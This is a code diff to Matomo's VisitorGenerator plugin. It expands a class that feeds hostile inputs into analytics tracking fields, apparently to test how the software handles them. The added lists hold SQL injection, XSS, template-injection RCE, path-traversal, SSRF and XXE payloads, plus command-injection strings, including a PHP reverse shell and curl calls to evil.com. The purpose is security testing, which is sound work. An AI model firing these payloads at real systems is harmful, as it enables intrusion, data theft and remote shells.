@@ -19,17 +19,40 @@ use Piwik\Plugins\VisitorGenerator\Generator;
 class VisitsMalicious extends Generator
 {
     private $sqlPayloads = [
-        "' OR '1'='1' --",
+        "' OR '1'='1' --",  // Classic SQLi for PHP/MySQL
         "' OR 1=1#",
-        "' UNION SELECT NULL, version(), user() --",
+        "' UNION SELECT NULL, @@version, CURRENT_USER --",
         "'; DROP TABLE users; --",
-        "' AND SLEEP(3)--",
-        "'; EXEC xp_cmdshell(''dir''); --",
-        "admin' OR '1'='1",
-        "0; WAITFOR DELAY '0:0:05' --",
-        "') OR ('1'='1",
-        "' UNION ALL SELECT load_file('/etc/passwd') --",
-        "%27%20OR%201%3D1%20--",
+        "' AND IF(1=1, SLEEP(5), 0) --",  // Time-based for PHP apps
+        "'; EXEC xp_cmdshell('dir'); --",  // If MSSQL with PHP
+        "admin' --",
+        "1; WAITFOR DELAY '0:0:5' --",
+        "') OR ('1'='1' --",
+        "' UNION SELECT LOAD_FILE('/etc/passwd') --",
+        "%27 OR 1=1 --",
+        "' OR ''='",
+        "1' OR '1'='1",
+        "' UNION SELECT 1, DATABASE(), 3 --",
+        "'; SELECT BENCHMARK(10000000,MD5(1)); --",
+        "' AND 1=0 UNION SELECT @@version --",
+        "1'; EXECUTE IMMEDIATE 'SEL' || 'ECT * FROM users'; --",  // Oracle-style, if applicable
+        "' OR 1=1 LIMIT 1 --",
+        "admin')--",
+        "' HAVING 1=1 --",
+        "' GROUP BY 1 HAVING 1=1--",
+        "') UNION SELECT NULL, NULL --",
+        "'; DECLARE @x VARCHAR(99); SET @x='dir'; EXEC master..xp_cmdshell @x; --",
+        "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
+        "1 AND 1=0 UNION ALL SELECT 'admin', MD5('password')",
+        "' OR EXISTS(SELECT * FROM dual WHERE DATABASE() LIKE '%')--",
+        "admin' AND 1=0 UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
+        "' OR 1=1 /*",
+        "') OR ('a'='a",
+        "')) OR (('1'='1",
+        "'/**/OR/**/1=1--",  // Comment bypass for PHP filters
+        "1' ORDER BY 1--",  // Column enumeration
+        "1' UNION SELECT IF(SUBSTRING(current_user(),1,1)='r',SLEEP(5),1)--",  // Blind extraction
+        "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64 --",
     ];
 
     private $scriptPayloads = [
@@ -45,37 +68,113 @@ class VisitsMalicious extends Generator
         "<math href=\"javascript:alert(1)\">",
         "&lt;script&gt;alert('xss')&lt;/script&gt;",
         "%3Cscript%3Ealert(1)%3C/script%3E",
+        // jQuery-specific
+        "#\"><img src=x onerror=alert(1)>",  // For jQuery selector sinks
+        "');alert(1);//",  // For script tags in jQuery.html()
+        "<div id=\"x\"><script>alert(1)</script></div>",  // If using jQuery.append()
+        // jQuery UI specific
+        "<div title=\"<img src=x onerror=alert(1)>\">",  // For tooltip or dialog in jQuery UI
+        "<button><img src=x onerror=alert(1)></button>",  // Checkboxradio widget XSS
+        // Vue.js 3 specific
+        "{{ constructor.constructor('alert(1)')() }}",
+        "{{ \$emit('xss', alert(1)) }}",
+        "<div v-html=\"'<script>alert(1)</script>'\"></div>",
+        "{{ alert(1) }}",
+        "javascript:alert(1)//",
+        "{{ _c('img',{attrs:{src:'x',onerror:'alert(1)'}}) }}",  // Vue render function
+        "<template><div @click=\"alert(1)\">Click</div></template>",
+        "{{ this.\$nextTick(() => alert(1)) }}",
+        "<img :src=\"'x'\" onerror=\"alert(1)\">",
+        "v-bind:href=\"'javascript:alert(1)'\"",
+        "{{ []._proto_.push(alert(1)) }}",  // Prototype pollution attempt
     ];
 
     private $templatePayloads = [
-        '{{7*7}}',
-        '{{ constructor.constructor(\'return globalThis.process\')() }}',
-        '{{ this.$emit(\'steal\', document.cookie) }}',
-        '{% set p = [\'../../../../etc/passwd\'] %}',
-        '{{=it.evil}}',
-        '{{#each this as |v|}}<script>{{/each}}',
-        '<%= global.process.env %>',
-        '${7*7}',
-        '{{range .}}<script>{{end}}',
-        '{{ dump(app.request) }}',
-        '{{().__class__.__mro__[1].__subclasses__()[40](\"id\").system(\"whoami\")}}',
+        // Twig-specific SSTI
+        '{{ 7*7 }}',  // Basic expression test
+        '{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}',  // RCE via filter
+        '{{ app.request.server.get("SERVER_NAME") }}',  // Expose server info
+        '{{ include("/etc/passwd") }}',  // File inclusion
+        '{{ dump(_context) }}',  // Dump variables
+        '{{ config("app.debug") }}',  // If Symfony/Twig
+        '{% for key, value in _self.env.globals %}{{ key }}: {{ value }}{% endfor %}',  // Globals dump
+        '{{ _self.env.getFilter("system")("id") }}',  // If filter bypass
+        '{% set cmd = "id" %}{{ app.request.server.get("PATH_TRANSLATED")|split("/")|last|slice(0,-9)|join("/") ~ "/bin/sh -c " ~ cmd|system }}',  // Complex RCE
+        '{{ [].class.base.subclasses() }}',  // Class exploration
+        '{{ constant("PHP_OS") }}',
+        '{% debug %}',  // Debug mode
+        '{{ app.request.query.all|join }}',
+        '{{ _self.env.getTemplate("../../../../etc/passwd").render() }}',  // Path traversal
+        '{{ craft.requests.getPost("cmd")|exec }}',  // If filters allow
+        '{% import _self as tf %}{% macro a(x="id") %}{{ tf.env.getFilter("passthru")(x) }}{% endmacro %}{{ tf.a() }}',
+        '{{ settings.security.csrf_secret }}',  // Expose secrets
+        '{{ joiner.__init__.__globals__.os.popen("id").read() }}',  // Via builtins
+        '{{ cycler.__init__.__globals__.os.popen("id").read() }}',
+        '{{ lipsum.__globals__.os.popen("id").read() }}',
+        '{{ range.constructor("return globals()")().eval("__import__(\'os\').popen(\'id\').read()") }}',
+        // Vue.js template-like, but since Twig is primary
+        '{{ this.$parent.$parent.alert(1) }}',  // If mixed with Vue
     ];
 
     private $miscPayloads = [
+        // PHP-specific
         '../etc/passwd',
-        '{{$on(\'click\',()=>confirm(\'owned\'))}}',
-        'v-on:click="this.$root.hijack()"',
         '../../../../../windows/win.ini',
         '| ls -la |',
         '$(cat /etc/passwd)',
         'file:///etc/passwd',
         'gopher://127.0.0.1:11211/_stats',
-        '${jndi:ldap://evil.com/a}',
+        '${jndi:ldap://evil.com/a}',  // If Java, but for PHP less relevant
         'file://c:/windows/win.ini',
         'http://169.254.169.254/latest/meta-data/',
-        '<?php system($_GET["cmd"]); ?>',
-        '&lt;img src=x onerror=alert(1)&gt;',
+        '<?php system($_GET["cmd"]); ?>',  // PHP shell
         '%2F..%2F..%2Fetc%2Fpasswd',
+        '; cat /etc/passwd',
+        '`cat /etc/passwd`',
+        '&& dir',
+        '|| whoami',
+        '; sleep 5;',
+        '1 | id',
+        '../../../../../../../etc/shadow',
+        '....//....//etc/passwd',
+        '%00../../../../../../etc/passwd',
+        'file:///proc/self/environ',
+        'http://[::1]/',
+        'ldap://localhost:1389/Exploit',
+        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+        'expect://id',
+        '\\\\evil.com\\share',
+        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        '....\\/....\\/....\\/windows/system32/drivers/etc/hosts',
+        '; curl http://evil.com',
+        '$(curl http://evil.com)',
+        '1; ping -c 5 127.0.0.1',
+        '|| ping -c 5 127.0.0.1 ||',
+        'http://127.0.0.1:8080/ssrf',
+        'dict://evil.com:1337/',
+        'telnet://evil.com:23',
+        'ssh://evil.com',
+        'c:/boot.ini',
+        '%windir%\\system32\\calc.exe',
+        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',  // XXE if XML in PHP
+        '<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;',
+        // PHP command injection specific
+        '; php -r \'$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+        '&& php -i',
+        '| php -r "echo shell_exec(\'id\');"',
+        'system("id")',
+        'passthru("id")',
+        'exec("id")',
+        'shell_exec("id")',
+        '`id`',
+        // For include/eval in PHP
+        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==',
+        'php://filter/convert.base64-encode/resource=index.php',
+        'expect://whoami',
+        // Vue.js misc
+        'v-on:click="alert(1)"',
+        ':href="`javascript:alert(1)`"',
+        '{{$on.constructor.prototype.bind = $on => alert(1)}}',
     ];
 
     private $searchReferrers = [
@@ -96,12 +195,12 @@ class VisitsMalicious extends Generator
     ];
 
     private $maliciousBrands = [
-        '" Not A;Brand";v="99", "Chromium";v="95", "EvilBrowser";v="13"',
-        '"BadBrowser";v="105", "Sneaky";v="1.0"',
+        '" Not A;Brand";v="99", "Chromium";v="95", "\' OR \'1\'=\'1\' --";v="13"',
+        '"BadBrowser";v="105", "{{ 7*7 }}";v="1.0"',
         '"Edge";v="0", "Chrome";v="0", "Pwn";v="666"',
     ];
 
-    public function generate($time = false, $idSite = 1, $limit = 30)
+    public function generate($time = false, $idSite = 1, $limit = 30): int
     {
         $date = date("Y-m-d", $time);
 
@@ -110,13 +209,6 @@ class VisitsMalicious extends Generator
         $tracker->enableBulkTracking();
         $tokenAuth = Piwik::requestTemporarySystemAuthToken('VisitorGeneratorMalicious', 24);
         $site = $this->getCurrentSite($idSite);
-
-        $tracker->setAttributionInfo(json_encode([
-            $this->buildMaliciousReferrer($site['main_url']),
-            $this->randomPayload(),
-            $this->randomPayload(),
-            time() - $this->faker->numberBetween(1000, 50000),
-        ]));
 
         $tracker->setNewVisitorId();
         if ($this->trackNonProfilable) {
@@ -137,11 +229,20 @@ class VisitsMalicious extends Generator
                 } else {
                     $tracker->setUserId(false);
                 }
+                $tracker->setUrlReferrer($this->buildMaliciousReferrer());
+
+                $tracker->setUserAgent($this->buildUserAgent());
+
+                $tracker->setAttributionInfo(json_encode([
+                    $this->buildMaliciousReferrer(),
+                    $this->randomPayload(),
+                    $this->randomPayload(),
+                    time() - $this->faker->numberBetween(1000, 50000),
+                ]));
             }
 
             $tracker->setTokenAuth($tokenAuth);
             $tracker->setIdSite($idSite);
-            $tracker->setUserAgent($this->buildUserAgent());
             $this->setMaliciousClientHints($tracker);
             $tracker->setBrowserLanguage($this->faker->randomElement(['en', 'en-US', 'de', 'fr', 'es']));
             $tracker->setCity($this->randomPayload());
@@ -153,7 +254,6 @@ class VisitsMalicious extends Generator
             $tracker->setLocalTime($this->faker->time('H:i:s'));
             $tracker->setForceVisitDateTime($date . ' ' . $this->faker->time('H:i:s'));
             $tracker->setUrl($this->buildMaliciousUrl($site['main_url']));
-            $tracker->setUrlReferrer($this->buildMaliciousReferrer($site['main_url']));
 
             $tracker->setCustomTrackingParameter('payload', $this->randomPayload());
             $tracker->setCustomTrackingParameter('ca', $this->randomPayload());
@@ -244,7 +344,7 @@ class VisitsMalicious extends Generator
         return $actions;
     }
 
-    private function buildMaliciousUrl($baseUrl)
+    private function buildMaliciousUrl($baseUrl): string
     {
         $baseUrl = rtrim($baseUrl, '/');
         $campaign = $this->buildCampaignParameters();
@@ -258,11 +358,10 @@ class VisitsMalicious extends Generator
         return $baseUrl . '/malicious/' . rawurlencode($this->randomPayload()) . '?' . $query . '#' . rawurlencode($this->randomPayload());
     }
 
-    private function buildMaliciousReferrer($baseUrl)
+    private function buildMaliciousReferrer(): string
     {
         $token = $this->randomPayload();
         $type = $this->faker->randomElement(['search', 'social', 'generic', 'direct']);
-        $baseUrl = rtrim($baseUrl, '/');
 
         if ($type === 'search') {
             $searchBase = $this->faker->randomElement($this->searchReferrers);
@@ -276,13 +375,15 @@ class VisitsMalicious extends Generator
         }
 
         if ($type === 'generic') {
-            return $baseUrl . '/referrer?payload=' . rawurlencode($token) . '&next=' . rawurlencode($this->randomPayload());
+            $base           = $this->faker->url;
+            $paramSeparator = strpos($base, '?') === false ? '?' : '&';
+            return $base . $paramSeparator . 'payload=' . rawurlencode($token) . '&next=' . rawurlencode($this->randomPayload());
         }
 
         return '';
     }
 
-    private function buildCampaignParameters()
+    private function buildCampaignParameters(): array
     {
         return [
             'pk_campaign' => $this->randomPayload(),
@@ -294,12 +395,12 @@ class VisitsMalicious extends Generator
         ];
     }
 
-    private function buildOrderId($payload, $sqlPayload)
+    private function buildOrderId(string $payload, string $sqlPayload): string
     {
-        return substr($payload . '-' . $sqlPayload . '-' . $this->faker->randomNumber(5), 0, 100);
+        return substr($this->randomPayload() . '-' . $this->faker->randomNumber(5), 0, 100);
     }
 
-    private function setMaliciousClientHints($tracker)
+    private function setMaliciousClientHints(\MatomoTracker $tracker): void
     {
         $tracker->setClientHints(
             substr($this->randomPayload(), 0, 30),
@@ -311,7 +412,7 @@ class VisitsMalicious extends Generator
         );
     }
 
-    private function trackMaliciousMedia(\MatomoTracker $tracker)
+    private function trackMaliciousMedia(\MatomoTracker $tracker): void
     {
         if (!Manager::getInstance()->isPluginActivated('MediaAnalytics')) {
             return; // plugin not available
@@ -325,7 +426,7 @@ class VisitsMalicious extends Generator
         $tracker->clearCustomTrackingParameters();
     }
 
-    private function setActionScopePayloads(\MatomoTracker $tracker)
+    private function setActionScopePayloads(\MatomoTracker $tracker): void
     {
         $tracker->setCustomVariable(3, 'sql', $this->randomPayload(), 'page');
         $tracker->setCustomVariable(4, 'js', $this->randomPayload(), 'page');
@@ -334,14 +435,14 @@ class VisitsMalicious extends Generator
         $tracker->setCustomTrackingParameter('bad', $this->randomPayload());
     }
 
-    private function randomPayload()
+    private function randomPayload(): string
     {
         $pool = array_merge($this->sqlPayloads, $this->scriptPayloads, $this->templatePayloads, $this->miscPayloads);
 
         return $this->faker->randomElement($pool);
     }
 
-    private function buildPageTitle()
+    private function buildPageTitle(): string
     {
         return sprintf(
             "%s | %s | %s",
@@ -351,8 +452,16 @@ class VisitsMalicious extends Generator
         );
     }
 
-    private function buildUserAgent()
+    private function buildUserAgent(): string
     {
+        if ($this->faker->boolean(10)) {
+            return $this->faker->userAgent;
+        }
+
+        if ($this->faker->boolean(35)) {
+            return $this->randomPayload() . '/46.3.30 (iPad; iOS 15.0.2; Scale/2.00)';
+        }
+
         $base = 'VisitorGeneratorMalicious/1.0';
         $choice = $this->randomPayload();
         $suffix = substr($this->randomPayload() . ' ' . $this->randomPayload() . ' ' . $choice, 0, 140);
@@ -360,7 +469,7 @@ class VisitsMalicious extends Generator
         return trim($base . ' ' . $suffix);
     }
 
-    private function getCurrentSite($idSite)
+    private function getCurrentSite($idSite): array
     {
         return SitesManagerApi::getInstance()->getSiteFromId($idSite);
     }
